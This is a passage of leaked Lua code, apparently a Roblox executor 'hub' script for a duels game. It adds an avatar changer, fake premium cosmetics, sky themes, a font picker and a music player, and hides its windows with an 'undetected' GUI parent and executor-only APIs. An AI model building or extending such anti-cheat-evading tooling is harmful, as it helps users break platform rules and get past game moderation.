            username.Text = "@" .. tostring(userData.name)
            username.TextColor3 = Color3.fromRGB(162, 162, 162)
            username.Font = Enum.Font.GothamMedium
            username.TextSize = 9
            username.TextXAlignment = Enum.TextXAlignment.Center
            username.Position = UDim2.new(0,5,0,137)
            username.Size = UDim2.new(1,-10,0,15)
            username.ZIndex = 6
            username.Parent = card

            card.MouseButton1Click:Connect(function()
                spawnAvatar(userData.id, userData.name, function(v)
                    status.Text = tostring(v)
                end)
                task.defer(function()
                    if sg and sg.Parent then
                        sg:Destroy()
                    end
                end)
            end)
        end

        local function renderFeatured()
            clearCards()
            sectionLabel.Text = "FEATURED"
            local count = 0
            for _, u in ipairs(featuredUsers) do
                count += 1
                addCard(u, count)
            end
            status.Text = tostring(count) .. " FEATURED AVATARS"
        end

        local function renderSearch()
            clearCards()
            sectionLabel.Text = "SEARCH RESULTS"
            local count = 0
            for _, u in ipairs(searchResults) do
                count += 1
                addCard(u, count)
            end
            status.Text = tostring(count) .. " RESULTS"
        end

        local function searchAnyUser(query)
            query = tostring(query or ""):gsub("^%s+",""):gsub("%s+$","")
            searchToken += 1
            local myToken = searchToken

            if query == "" then
                searchResults = {}
                renderFeatured()
                return
            end

            status.Text = "SEARCHING..."
            sectionLabel.Text = "SEARCH RESULTS"

            task.spawn(function()
                local results = {}

                --Leaked By Xlu0 AndPrime--
                local okId, uid = pcall(function()
                    return Players:GetUserIdFromNameAsync(query)
                end)

                if myToken ~= searchToken then return end

                if okId and uid and uid > 0 then
                    local okInfo, body = pcall(function()
                        return game:HttpGet("https://users.roblox.com/v1/users/" .. tostring(uid))
                    end)
                    if okInfo and body and body ~= "" then
                        local okJson, data = pcall(function()
                            return HttpService:JSONDecode(body)
                        end)
                        if okJson and type(data) == "table" then
                            table.insert(results, {
                                id = tonumber(data.id) or uid,
                                name = tostring(data.name or query),
                                displayName = tostring(data.displayName or data.name or query),
                                hasVerifiedBadge = data.hasVerifiedBadge == true
                            })
                        end
                    end
                end

                --Leaked By Xlu0 AndPrime--
                local encoded = HttpService:UrlEncode(query)
                local okSearch, body = pcall(function()
                    return game:HttpGet(
                        "https://users.roblox.com/v1/users/search?keyword=" ..
                        encoded .. "&limit=20"
                    )
                end)

                if myToken ~= searchToken then return end

                if okSearch and body and body ~= "" then
                    local okJson, data = pcall(function()
                        return HttpService:JSONDecode(body)
                    end)
                    if okJson and type(data) == "table" and type(data.data) == "table" then
                        local seen = {}
                        for _, r in ipairs(results) do seen[r.id] = true end

                        for _, item in ipairs(data.data) do
                            local id = tonumber(item.id)
                            if id and not seen[id] then
                                seen[id] = true
                                table.insert(results, {
                                    id = id,
                                    name = tostring(item.name or id),
                                    displayName = tostring(item.displayName or item.name or id),
                                    hasVerifiedBadge = item.hasVerifiedBadge == true
                                })
                            end
                        end
                    end
                end

                if myToken ~= searchToken then return end
                searchResults = results
                renderSearch()
            end)
        end

        input:GetPropertyChangedSignal("Text"):Connect(function()
            local current = input.Text
            task.delay(0.18, function()
                if input.Text == current then
                    searchAnyUser(current)
                end
            end)
        end)

        close.MouseButton1Click:Connect(function()
            sg:Destroy()
        end)

        --Leaked By Xlu0 AndPrime--
        task.spawn(function()
            local pending = #famousSeeds
            local seen = {}

            if pending == 0 then
                status.Text = "NO FEATURED USERS"
                return
            end

            for _, seedName in ipairs(famousSeeds) do
                task.spawn(function()
                    local okId, uid = pcall(function()
                        return Players:GetUserIdFromNameAsync(seedName)
                    end)

                    if okId and uid and uid > 0 and not seen[uid] then
                        seen[uid] = true

                        local okInfo, body = pcall(function()
                            return game:HttpGet("https://users.roblox.com/v1/users/" .. tostring(uid))
                        end)

                        if okInfo and body and body ~= "" then
                            local okJson, data = pcall(function()
                                return HttpService:JSONDecode(body)
                            end)

                            if okJson and type(data) == "table" then
                                --Leaked By Xlu0 AndPrime--
                                table.insert(featuredUsers, {
                                    id = tonumber(data.id) or uid,
                                    name = tostring(data.name or seedName),
                                    displayName = tostring(data.displayName or data.name or seedName),
                                    hasVerifiedBadge = data.hasVerifiedBadge == true
                                })

                                table.sort(featuredUsers, function(a,b)
                                    return string.lower(a.displayName or a.name)
                                        < string.lower(b.displayName or b.name)
                                end)

                                if input.Text == "" and sg.Parent then
                                    renderFeatured()
                                end
                            end
                        end
                    end

                    pending -= 1
                    if pending <= 0 and input.Text == "" and sg.Parent then
                        renderFeatured()
                    end
                end)
            end
        end)
    end

    LP.CharacterAdded:Connect(function()
        task.wait(0.35)
        if XAC.lastUserId then
            local uid, name = XAC.lastUserId, XAC.lastUsername
            task.defer(function()
                spawnAvatar(uid,name or tostring(uid),function() end)
            end)
        end
    end)

    --Leaked By Xlu0 AndPrime--
    task.defer(function()
        task.wait(0.5)
        if XAC.lastUserId and LP.Character then
            spawnAvatar(XAC.lastUserId, XAC.lastUsername or tostring(XAC.lastUserId), function() end)
        end
    end)
end

_G.SoundInstallAvatarChanger()
_G.SoundInstallAvatarChanger = nil

--Leaked By Xlu0 AndPrime--
if _G.SoundAvatarChangerState then
    _G.SoundAvatarChangerState.lastUserId = _G.SoundSavedAvatarChangerUserId
    _G.SoundAvatarChangerState.lastUsername = (_G.SoundSavedAvatarChangerUsername ~= "" and _G.SoundSavedAvatarChangerUsername) or nil
end

--Leaked By Xlu0 AndPrime--
do
    local originalApplyHeadless = _G.SoundApplyHeadless
    local originalApplyKorblox = _G.SoundApplyKorblox
    local originalApplyCharacterVisuals = _G.SoundApplyCharacterVisuals

    if originalApplyHeadless then
        _G.SoundApplyHeadless = function(char, enabled)
            originalApplyHeadless(char, enabled)

            local state = _G.SoundAvatarChangerState
            local overlay = state and state.model
            if overlay and overlay.Parent and overlay ~= char then
                pcall(function()
                    originalApplyHeadless(overlay, enabled)
                end)
            end
        end
    end

    if originalApplyKorblox then
        _G.SoundApplyKorblox = function(char, enabled)
            originalApplyKorblox(char, enabled)

            local state = _G.SoundAvatarChangerState
            local overlay = state and state.model
            if overlay and overlay.Parent and overlay ~= char then
                pcall(function()
                    originalApplyKorblox(overlay, enabled)
                end)
            end
        end
    end

    if originalApplyCharacterVisuals then
        _G.SoundApplyCharacterVisuals = function(char)
            originalApplyCharacterVisuals(char)

            local state = _G.SoundAvatarChangerState
            local overlay = state and state.model
            if overlay and overlay.Parent and overlay ~= char then
                pcall(function()
                    if originalApplyHeadless then
                        originalApplyHeadless(overlay, _G.SoundHeadlessEnabled == true)
                    end
                    if originalApplyKorblox then
                        originalApplyKorblox(overlay, _G.SoundKorbloxEnabled == true)
                    end
                end)
            end
        end
    end
end


function __SoundDuelsSetupVisualsUI()
local Utility = pages.VISUALS
local skyThemes = SKY_PRESETS_LIST or {"Off", "Night", "Aurora", "Sunset", "Galaxy", "Tech", "Sakura"}
local skyIndex = 1
for i, name in ipairs(skyThemes) do if name == skyTheme then skyIndex = i break end end
function skyThemeSelectorRow(parent, order)
local row = Instance.new("Frame")
row.Name = "Sky Theme"
row.ZIndex = 4
row.Size = UDim2.new(1,-4,0,52)
row.BackgroundTransparency = 1
row.BorderSizePixel = 0
row.LayoutOrder = order
row.Parent = parent

local label = Instance.new("TextLabel")
label.Name = "Label"
label.ZIndex = 5
label.Position = UDim2.new(0,2,0,0)
label.Size = UDim2.new(1,0,0,16)
label.BackgroundTransparency = 1
label.Text = "Sky Theme"
label.TextColor3 = Color3.fromRGB(255,255,255)
label.TextSize = 12
label.Font = Enum.Font.GothamBlack
label.TextXAlignment = Enum.TextXAlignment.Left
label.Parent = row

local left = Instance.new("TextButton")
left.Name = "SkyLeft"
left.ZIndex = 6
left.Position = UDim2.new(0,0,0,22)
left.Size = UDim2.new(0,44,0,25)
left.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
left.BackgroundTransparency = 0.18
left.BorderSizePixel = 0
left.Text = "<"
left.TextColor3 = Color3.fromRGB(255,255,255)
left.TextSize = 12
left.Font = Enum.Font.GothamMedium
left.AutoButtonColor = false
left.Parent = row
corner(left,7)
stroke(left,COLORS.strokeSoft,1,0.45)

local value = Instance.new("TextButton")
value.Name = "SkyValue"
value.ZIndex = 6
value.Position = UDim2.new(0,48,0,22)
value.Size = UDim2.new(1,-96,0,28)
value.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
value.BackgroundTransparency = 0.18
value.BorderSizePixel = 0
value.Text = skyThemes[skyIndex]
value.TextColor3 = Color3.fromRGB(255,255,255)
value.TextSize = 12
value.Font = Enum.Font.GothamMedium
value.AutoButtonColor = false
value.Parent = row
corner(value,7)
stroke(value,COLORS.strokeSoft,1,0.45)
skyValueLabel = value

local right = Instance.new("TextButton")
right.Name = "SkyRight"
right.ZIndex = 6
right.Position = UDim2.new(1,-44,0,22)
right.Size = UDim2.new(0,44,0,25)
right.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
right.BackgroundTransparency = 0.18
right.BorderSizePixel = 0
right.Text = ">"
right.TextColor3 = Color3.fromRGB(255,255,255)
right.TextSize = 12
right.Font = Enum.Font.GothamMedium
right.AutoButtonColor = false
right.Parent = row
corner(right,7)
stroke(right,COLORS.strokeSoft,1,0.45)

local function setSkyIndex(nextIndex)
if nextIndex < 1 then nextIndex = #skyThemes end
if nextIndex > #skyThemes then nextIndex = 1 end
skyIndex = nextIndex
skyTheme = skyThemes[skyIndex]
if applyCustomSky then applyCustomSky(skyTheme) end
if skyValueLabel then skyValueLabel.Text = skyTheme end
end

left.Activated:Connect(function() setSkyIndex(skyIndex - 1) end)
right.Activated:Connect(function() setSkyIndex(skyIndex + 1) end)
return row
end

section(Utility, "CHARACTER VISUALS", -3)

_, _G.SoundHeadlessVisual = toggleRow(Utility, "Headless", _G.SoundHeadlessEnabled, -2)
_G.SoundHeadlessRow = Utility:FindFirstChild("Headless")
_G.SoundHeadlessButton = _G.SoundHeadlessRow and _G.SoundHeadlessRow:FindFirstChild("ToggleButton")
if _G.SoundHeadlessButton then
_G.SoundHeadlessButton.Activated:Connect(function()
_G.SoundHeadlessEnabled = not _G.SoundHeadlessEnabled
_G.SoundApplyHeadless(LP.Character, _G.SoundHeadlessEnabled)
if _G.SoundHeadlessVisual then _G.SoundHeadlessVisual(_G.SoundHeadlessEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end

_, _G.SoundKorbloxVisual = toggleRow(Utility, "Korblox", _G.SoundKorbloxEnabled, -1)
_G.SoundKorbloxRow = Utility:FindFirstChild("Korblox")
_G.SoundKorbloxButton = _G.SoundKorbloxRow and _G.SoundKorbloxRow:FindFirstChild("ToggleButton")
if _G.SoundKorbloxButton then
_G.SoundKorbloxButton.Activated:Connect(function()
_G.SoundKorbloxEnabled = not _G.SoundKorbloxEnabled
_G.SoundApplyKorblox(LP.Character, _G.SoundKorbloxEnabled)
if _G.SoundKorbloxVisual then _G.SoundKorbloxVisual(_G.SoundKorbloxEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end

task.defer(function()
task.wait(0.8)
_G.SoundApplyCharacterVisuals(LP.Character)
if _G.SoundHeadlessVisual then _G.SoundHeadlessVisual(_G.SoundHeadlessEnabled) end
if _G.SoundKorbloxVisual then _G.SoundKorbloxVisual(_G.SoundKorbloxEnabled) end
end)



-- ============================================================
-- CUSTOM FONT SYSTEM (ported from BlueX Duels / Varyn Duel)
-- ============================================================
do
local __kxFontOk, __kxFontErr = pcall(function()
  local _LP = LP
  local _PlayerGui = PlayerGui
  local _Workspace = game:GetService("Workspace")
  local _TS = TweenService

  -- === Persistence ===
  _G.SoundFontCfgFile = "Sound Duels_CustomFont.json"
  _G.SoundFontAdvSelected = _G.SoundFontAdvSelected or "Default"
  _G.SoundFontAdvEnabled  = _G.SoundFontAdvEnabled  == true

  pcall(function()
    if type(isfile)=="function" and type(readfile)=="function" and isfile(_G.SoundFontCfgFile) then
      local d = game:GetService("HttpService"):JSONDecode(readfile(_G.SoundFontCfgFile))
      if type(d)=="table" then
        if type(d.selected)=="string" and d.selected~="" then _G.SoundFontAdvSelected=d.selected end
        if d.enabled~=nil then _G.SoundFontAdvEnabled=(d.enabled==true) end
      end
    end
  end)

  function _G.SoundSaveFontCfg()
    pcall(function()
      if type(writefile)~="function" then return end
      writefile(_G.SoundFontCfgFile, game:GetService("HttpService"):JSONEncode({
        selected = tostring(_G.SoundFontAdvSelected or "Default"),
        enabled  = _G.SoundFontAdvEnabled == true,
      }))
    end)
  end

  -- === Font Library ===
  _G.KXFonts            = _G.KXFonts or {}
  _G.KXFonts.orig       = _G.KXFonts.orig    or {}
  _G.KXFonts.conns      = _G.KXFonts.conns   or {}
  _G.KXFonts.size       = _G.KXFonts.size    or {}
  _G.KXFonts.tconns     = _G.KXFonts.tconns  or setmetatable({},{__mode="k"})
  _G.KXFonts.aconns     = _G.KXFonts.aconns  or setmetatable({},{__mode="k"})
  _G.KXFonts.m          = _G.KXFonts.m       or setmetatable({},{__mode="k"})
  _G.KXFonts.lastLen    = _G.KXFonts.lastLen or setmetatable({},{__mode="k"})
  _G.KXFonts.worldRoots = _G.KXFonts.worldRoots or setmetatable({},{__mode="k"})
  _G.KXFonts.stamp      = _G.KXFonts.stamp   or 0
  _G.KXFontChoice       = _G.KXFontChoice     or "Default"

  _G.KXFonts.WEIGHT_LABEL = {
    Thin="Thin", ExtraLight="XLight", Light="Light", Regular="",
    Medium="Med", SemiBold="SBold", Bold="Bold", ExtraBold="XBold", Heavy="Heavy",
  }
  _G.KXFonts.MIN_SIZE = 7
  _G.KXFonts.MARGIN   = 8
  _G.KXFonts.MAX_GROW = 1.35

  -- Build font list: unique families only (no weight variants to keep list short & readable)
  function _G.KXFonts.list()
    local F = _G.KXFonts
    if F.cache then return F.cache end
    local out = {{ key="Default", label="[ Default ]", font=nil }}
    local seen = {}
    for _, item in ipairs(Enum.Font:GetEnumItems()) do
      if item.Name ~= "Unknown" then
        local ok, f = pcall(function() return Font.fromEnum(item) end)
        if ok and f and f.Family and not seen[f.Family] then
          seen[f.Family] = true
          -- Clean readable name: strip path, strip .json
          local nice = tostring(f.Family):match("/([^/]+)%.json$")
                    or tostring(f.Family):match("/([^/]+)$")
                    or item.Name
          -- Also try from enum name directly (more readable)
          nice = item.Name ~= "Unknown" and item.Name or nice
          -- Add weight variants: Regular, Bold, Light only (keep list manageable)
          for _, wInfo in ipairs({
            {w=Enum.FontWeight.Regular, italic=false, suffix=""},
            {w=Enum.FontWeight.Bold,    italic=false, suffix=" Bold"},
            {w=Enum.FontWeight.Light,   italic=false, suffix=" Light"},
            {w=Enum.FontWeight.Regular, italic=true,  suffix=" Italic"},
          }) do
            local ok2, ff = pcall(function()
              return Font.new(f.Family, wInfo.w,
                wInfo.italic and Enum.FontStyle.Italic or Enum.FontStyle.Normal)
            end)
            if ok2 and ff then
              local label = nice .. wInfo.suffix
              local key = tostring(f.Family).."|"..wInfo.w.Name.."|"..(wInfo.italic and "i" or "n")
              out[#out+1] = { key=key, label=label, font=ff }
            end
          end
        end
      end
    end
    F.cache = out
    return out
  end

  function _G.KXFonts.byKey(key)
    for _, e in ipairs(_G.KXFonts.list()) do
      if e.key == key then return e end
    end
    return nil
  end

  function _G.KXFonts.roots()
    local list, seen = {}, {}
    local function add(r)
      if r and r.Parent and not seen[r] then seen[r]=true; list[#list+1]=r end
    end
    add(Gui)          -- SoundHubPolished ScreenGui
    add(_PlayerGui)
    pcall(function() add(getUndetectedGuiParent()) end)
    for root in pairs(_G.KXFonts.worldRoots) do add(root) end
    local char = _LP.Character
    local head = char and char:FindFirstChild("Head")
    if head then
      for _, n in ipairs({"SoundOverhead","LinxHeadIndicator","AmbitiousHubOverheadInfo"}) do
        add(head:FindFirstChild(n))
      end
    end
    return list
  end

  function _G.KXFonts.isGlyph(obj)
    local t = obj.Text; if t==nil then return false end
    if string.match(t,"%w") then return false end
    local ok,n = pcall(function() return utf8.len(t) end)
    return ok and n~=nil and n<=1
  end

  function _G.KXFonts.applyOne(obj, font)
    if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
    if obj:GetAttribute("KXFontLock") then return end
    local F = _G.KXFonts
    if F.orig[obj]==nil then F.orig[obj]=obj.FontFace; F.size[obj]=obj.TextSize end
    if F.isGlyph(obj) then font=nil end
    pcall(function()
      obj.FontFace = font or F.orig[obj]
      if F.size[obj] then obj.TextSize = F.size[obj] end
    end)
  end

  function _G.KXFonts.applyAll()
    local F = _G.KXFonts
    local font = F.current()
    for _, root in ipairs(F.roots()) do
      F.applyOne(root, font)
      for _, d in ipairs(root:GetDescendants()) do F.applyOne(d, font) end
    end
  end

  function _G.KXFonts.hook()
    local F = _G.KXFonts
    for _, c in ipairs(F.conns) do pcall(function() c:Disconnect() end) end
    F.conns = {}
    local function onAdded(d)
      if _G.KXFontChoice=="Default" then return end
      pcall(F.applyOne, d, F.current())
    end
    for _, root in ipairs(F.roots()) do
      if root and root.DescendantAdded then
        F.conns[#F.conns+1] = root.DescendantAdded:Connect(onAdded)
      end
    end
    F.conns[#F.conns+1] = _Workspace.DescendantAdded:Connect(function(d)
      if d:IsA("BillboardGui") or d:IsA("SurfaceGui") then F.worldRoots[d]=true end
      onAdded(d)
    end)
    F.conns[#F.conns+1] = _Workspace.DescendantRemoving:Connect(function(d)
      F.worldRoots[d]=nil
    end)
  end

  function _G.KXFonts.current()
    local key = _G.KXFontChoice
    if not key or key=="Default" then return nil end
    local e = _G.KXFonts.byKey(key)
    return e and e.font or nil
  end

  function _G.KXFonts.set(key, skipSave)
    _G.KXFontChoice = key or "Default"
    _G.KXFonts.applyAll()
    _G.KXFonts.hook()
    if not skipSave then pcall(_G.SoundSaveFontCfg) end
  end

  if not _G.KXFonts.charConn then
    _G.KXFonts.charConn = _LP.CharacterAdded:Connect(function()
      task.delay(1.5, function()
        if _G.KXFontChoice~="Default" then
          pcall(_G.KXFonts.applyAll)
          pcall(_G.KXFonts.hook)
        end
      end)
    end)
  end

  -- Build cache in background so picker opens instantly
  task.spawn(function() pcall(_G.KXFonts.list) end)

  -- === Font Picker Popup ===
  local _fpGui = nil
  local _fpClosing = false

  local function closePicker()
    local g = _fpGui
    if not (g and g.Parent) then _fpGui=nil; _fpClosing=false; return end
    if _fpClosing then return end
    _fpClosing = true
    if _fpGui==g then _fpGui=nil end
    pcall(function() g.Enabled=false end)
    pcall(function() g:Destroy() end)
    _fpClosing = false
  end
  _G.SoundFontPickerClose = closePicker

  local function openPicker()
    if _fpGui and _fpGui.Parent then
      pcall(function() _fpGui.Enabled=true; _fpGui.DisplayOrder=9999 end)
      return
    end
    _fpGui=nil; _fpClosing=false

    local parent = getUndetectedGuiParent()
    local old = parent and parent:FindFirstChild("SoundFontPicker")
    if old then old:Destroy() end

    local fpGui = Instance.new("ScreenGui")
    fpGui.Name="SoundFontPicker"
    fpGui.ResetOnSpawn=false
    fpGui.IgnoreGuiInset=true
    fpGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    fpGui.DisplayOrder=9999
    fpGui.Parent=parent
    _fpGui=fpGui

    -- Backdrop
    local back = Instance.new("Frame")
    back.Size=UDim2.new(1,0,1,0)
    back.BackgroundColor3=Color3.fromRGB(0,0,0)
    back.BackgroundTransparency=0.5
    back.BorderSizePixel=0; back.ZIndex=1; back.Active=true
    back.Parent=fpGui

    -- Main frame
    local frame = Instance.new("Frame")
    frame.Size=UDim2.new(0,310,0,430)
    frame.Position=UDim2.new(0.5,-155,0.5,-215)
    frame.BackgroundColor3=Color3.fromRGB(10,10,12)
    frame.BorderSizePixel=0; frame.ZIndex=2; frame.Parent=fpGui
    corner(frame,14)
    stroke(frame,Color3.fromRGB(80,80,95),1.2,0.25)

    -- Title bar
    local bar = Instance.new("Frame")
    bar.Size=UDim2.new(1,0,0,44)
    bar.BackgroundColor3=Color3.fromRGB(14,14,16)
    bar.BackgroundTransparency=0; bar.BorderSizePixel=0
    bar.ZIndex=3; bar.Parent=frame; corner(bar,14)

    local title = Instance.new("TextLabel")
    title.Size=UDim2.new(1,-54,1,0)
    title.Position=UDim2.new(0,14,0,0)
    title.BackgroundTransparency=1
    title.Text="PILIH FONT"
    title.TextColor3=Color3.fromRGB(245,245,245)
    title.Font=Enum.Font.GothamBlack; title.TextSize=13
    title.TextXAlignment=Enum.TextXAlignment.Left
    title.ZIndex=4; title.Parent=bar
    title:SetAttribute("KXFontLock",true)

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size=UDim2.new(0,30,0,30)
    closeBtn.Position=UDim2.new(1,-40,0,7)
    closeBtn.BackgroundColor3=Color3.fromRGB(28,28,32)
    closeBtn.BackgroundTransparency=0; closeBtn.BorderSizePixel=0
    closeBtn.Text="X"; closeBtn.TextColor3=Color3.fromRGB(220,220,220)
    closeBtn.Font=Enum.Font.GothamBlack; closeBtn.TextSize=12
    closeBtn.AutoButtonColor=false; closeBtn.ZIndex=10; closeBtn.Parent=bar
    corner(closeBtn,8); stroke(closeBtn,Color3.fromRGB(80,80,95),1,0.4)
    closeBtn:SetAttribute("KXFontLock",true)
    closeBtn.MouseEnter:Connect(function() tween(closeBtn,{BackgroundColor3=Color3.fromRGB(180,45,45)}) end)
    closeBtn.MouseLeave:Connect(function() tween(closeBtn,{BackgroundColor3=Color3.fromRGB(28,28,32)}) end)
    closeBtn.Activated:Connect(closePicker)

    -- Search box
    local searchBox = Instance.new("TextBox")
    searchBox.Size=UDim2.new(1,-20,0,28)
    searchBox.Position=UDim2.new(0,10,0,50)
    searchBox.BackgroundColor3=Color3.fromRGB(20,20,24)
    searchBox.BackgroundTransparency=0; searchBox.BorderSizePixel=0
    searchBox.Text=""; searchBox.PlaceholderText="Cari font..."
    searchBox.PlaceholderColor3=Color3.fromRGB(100,100,110)
    searchBox.TextColor3=Color3.fromRGB(230,230,230)
    searchBox.Font=Enum.Font.GothamMedium; searchBox.TextSize=12
    searchBox.ClearTextOnFocus=false; searchBox.ZIndex=5
    searchBox.Parent=frame
    corner(searchBox,8); stroke(searchBox,Color3.fromRGB(70,70,85),1,0.4)
    searchBox:SetAttribute("KXFontLock",true)

    -- Scroll
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size=UDim2.new(1,-10,1,-90)
    scroll.Position=UDim2.new(0,5,0,85)
    scroll.BackgroundTransparency=1; scroll.BorderSizePixel=0
    scroll.ScrollBarThickness=3
    scroll.ScrollBarImageColor3=Color3.fromRGB(90,90,100)
    scroll.CanvasSize=UDim2.new(0,0,0,0)
    scroll.AutomaticCanvasSize=Enum.AutomaticSize.Y
    scroll.ZIndex=3; scroll.Parent=frame

    local layout = Instance.new("UIListLayout")
    layout.SortOrder=Enum.SortOrder.LayoutOrder
    layout.Padding=UDim.new(0,4)
    layout.Parent=scroll

    local pad = Instance.new("UIPadding")
    pad.PaddingLeft=UDim.new(0,4); pad.PaddingRight=UDim.new(0,4)
    pad.PaddingTop=UDim.new(0,4)
    pad.Parent=scroll

    local allFonts = _G.KXFonts.list()
    local rowCache = {}

    local function makeRow(entry)
      local row = Instance.new("Frame")
      row.Size=UDim2.new(1,0,0,36)
      row.BackgroundColor3=Color3.fromRGB(18,18,22)
      row.BackgroundTransparency=0; row.BorderSizePixel=0
      row.ZIndex=4; corner(row,9)

      local isSel = ((_G.SoundFontAdvSelected or _G.KXFontChoice)==entry.key)
      local st = stroke(row, isSel and Color3.fromRGB(220,220,220) or Color3.fromRGB(50,50,60), 1.1, isSel and 0.2 or 0.55)

      -- Preview "Aa"
      local prv = Instance.new("TextLabel")
      prv.Size=UDim2.new(0,44,1,-8); prv.Position=UDim2.new(0,6,0,4)
      prv.BackgroundTransparency=1
      prv.Text="Aa"
      prv.TextColor3=Color3.fromRGB(240,240,240)
      prv.TextSize=18; prv.ZIndex=5
      if entry.font then prv.FontFace=entry.font else prv.Font=Enum.Font.GothamBlack end
      prv.Parent=row
      prv:SetAttribute("KXFontLock",true)

      -- Label
      local lbl = Instance.new("TextLabel")
      lbl.Size=UDim2.new(1,-60,1,0); lbl.Position=UDim2.new(0,54,0,0)
      lbl.BackgroundTransparency=1
      lbl.Text=entry.label
      lbl.TextColor3=Color3.fromRGB(220,220,220)
      lbl.Font=Enum.Font.GothamMedium; lbl.TextSize=11
      lbl.TextXAlignment=Enum.TextXAlignment.Left
      lbl.TextTruncate=Enum.TextTruncate.AtEnd
      lbl.ZIndex=5; lbl.Parent=row
      lbl:SetAttribute("KXFontLock",true)

      -- Click button overlay
      local btn = Instance.new("TextButton")
      btn.Size=UDim2.new(1,0,1,0); btn.BackgroundTransparency=1
      btn.Text=""; btn.AutoButtonColor=false; btn.ZIndex=6; btn.Parent=row

      btn.MouseEnter:Connect(function()
        tween(row,{BackgroundColor3=Color3.fromRGB(30,30,38)})
      end)
      btn.MouseLeave:Connect(function()
        tween(row,{BackgroundColor3=Color3.fromRGB(18,18,22)})
      end)
      btn.Activated:Connect(function()
        _G.SoundFontAdvSelected = entry.key
        _G.KXFontChoice = entry.key
        if _G.SoundFontAdvEnabled then
          pcall(_G.KXFonts.set, entry.key, true)
        end
        pcall(_G.SoundSaveFontCfg)
        -- Refresh all row strokes
        for _, r in ipairs(rowCache) do
          local rst = r.frame:FindFirstChildOfClass("UIStroke")
          local sel2 = (r.key==entry.key)
          if rst then
            tween(rst,{
              Color = sel2 and Color3.fromRGB(220,220,220) or Color3.fromRGB(50,50,60),
              Transparency = sel2 and 0.2 or 0.55,
            })
          end
        end
      end)

      return row
    end

    local function buildList(filter)
      -- Clear existing
      for _, c in ipairs(scroll:GetChildren()) do
        if c:IsA("Frame") then c:Destroy() end
      end
      rowCache = {}
      local order = 0
      for _, entry in ipairs(allFonts) do
        local show = filter=="" or entry.label:lower():find(filter:lower(), 1, true)
        if show then
          order = order+1
          local row = makeRow(entry)
          row.LayoutOrder = order
          row.Parent = scroll
          rowCache[#rowCache+1] = {frame=row, key=entry.key}
        end
      end
    end

    buildList("")

    searchBox:GetPropertyChangedSignal("Text"):Connect(function()
      buildList(searchBox.Text)
    end)

    back.InputBegan:Connect(function(inp)
      if inp.UserInputType==Enum.UserInputType.MouseButton1
      or inp.UserInputType==Enum.UserInputType.Touch then
        closePicker()
      end
    end)

    -- Animate in
    frame.Size=UDim2.new(0,0,0,0)
    frame.Position=UDim2.new(0.5,0,0.5,0)
    _TS:Create(frame, TweenInfo.new(0.28,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {
      Size=UDim2.new(0,310,0,430),
      Position=UDim2.new(0.5,-155,0.5,-215)
    }):Play()
  end

  _G.SoundFontPickerOpen = function() pcall(openPicker) end

end)
if not __kxFontOk then
  warn("[Sound] Custom Font gagal load: " .. tostring(__kxFontErr))
end
end
-- ============================================================


-- ============================================================
-- MUSIC PLAYER (diambil dari BlueX Duels)
-- download -> cache -> getcustomasset, lalu dimainkan lewat Sound
-- Dibuka lewat toggle "Music Player" di tab Utility (tepat di bawah Font Picker)
-- Dibungkus pcall supaya kalau error script utama tetap jalan.
-- ============================================================
do
local __kxMusicOk, __kxMusicErr = pcall(function()
  local VARYN_TweenService = game:GetService("TweenService")
  local VARYN_SoundService = game:GetService("SoundService")
  local LP = game:GetService("Players").LocalPlayer

  -- shim: music player butuh S.themeColor dan F.saveConfig (-> saveSoundConfig)
  local S = setmetatable({}, {__index = function(_, k)
    if k == "themeColor" then
      local c = Color3.fromRGB(235,235,235)
      pcall(function()
        local th = getTheme()
        if th and th.ACCENT then c = th.ACCENT end
      end)
      return c
    end
    return nil
  end})
  local F = {saveConfig = function() if type(saveSoundConfig) == "function" then pcall(saveSoundConfig) end end}

  local function corner(obj, radius)
    if not obj then return nil end
    local c = obj:FindFirstChildOfClass("UICorner")
    if not c then c = Instance.new("UICorner"); c.Parent = obj end
    c.CornerRadius = UDim.new(0, tonumber(radius) or 10)
    return c
  end
  local function stroke(obj, color, thickness, transparency)
    if not obj then return nil end
    local st = obj:FindFirstChildOfClass("UIStroke")
    if not st then st = Instance.new("UIStroke"); st.Parent = obj end
    st.Color = color or Color3.fromRGB(90, 90, 105)
    st.Thickness = thickness or 1
    st.Transparency = transparency == nil and 0.5 or transparency
    return st
  end
  local function getPopupParent()
    local parent = nil
    pcall(function() if type(getUndetectedGuiParent) == "function" then parent = getUndetectedGuiParent() end end)
    if typeof(parent) ~= "Instance" then
      pcall(function() if type(gethui) == "function" then parent = gethui() end end)
    end
    if typeof(parent) ~= "Instance" then
      pcall(function() parent = game:GetService("CoreGui") end)
    end
    if typeof(parent) ~= "Instance" then
      parent = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 5)
    end
    return parent
  end
  local function fetchExternal(url)
    if type(game.HttpGet) == "function" then
      local ok, data = pcall(function() return game:HttpGet(url) end)
      if ok and type(data) == "string" and #data > 0 then return data end
    end
    local req = (type(request) == "function" and request)
      or (type(http_request) == "function" and http_request)
      or (type(syn) == "table" and type(syn.request) == "function" and syn.request)
    if req then
      local ok, res = pcall(function() return req({Url = url, Method = "GET"}) end)
      if ok and type(res) == "table" then
        local body = res.Body or res.body
        if type(body) == "string" and #body > 0 then return body end
      end
    end
    return nil
  end
  local function getCustomAsset(path)
    if type(getcustomasset) == "function" then
      local ok, id = pcall(getcustomasset, path)
      if ok and id then return id end
    end
    if type(getsynasset) == "function" then
      local ok, id = pcall(getsynasset, path)
      if ok and id then return id end
    end
    return nil
  end
  local function VARYN_tween(obj, props, duration)
    if not obj then return nil end
    local ok, tw = pcall(function()
      return VARYN_TweenService:Create(obj,
        TweenInfo.new(duration or 0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props)
    end)
    if ok and tw then tw:Play() return tw end
    return nil
  end
  local function _VarynMusicNotify(msg)
    pcall(function()
      if type(_safeNotify) == "function" then _safeNotify(tostring(msg))
      elseif type(showActionNotification) == "function" then showActionNotification(tostring(msg)) end
    end)
  end

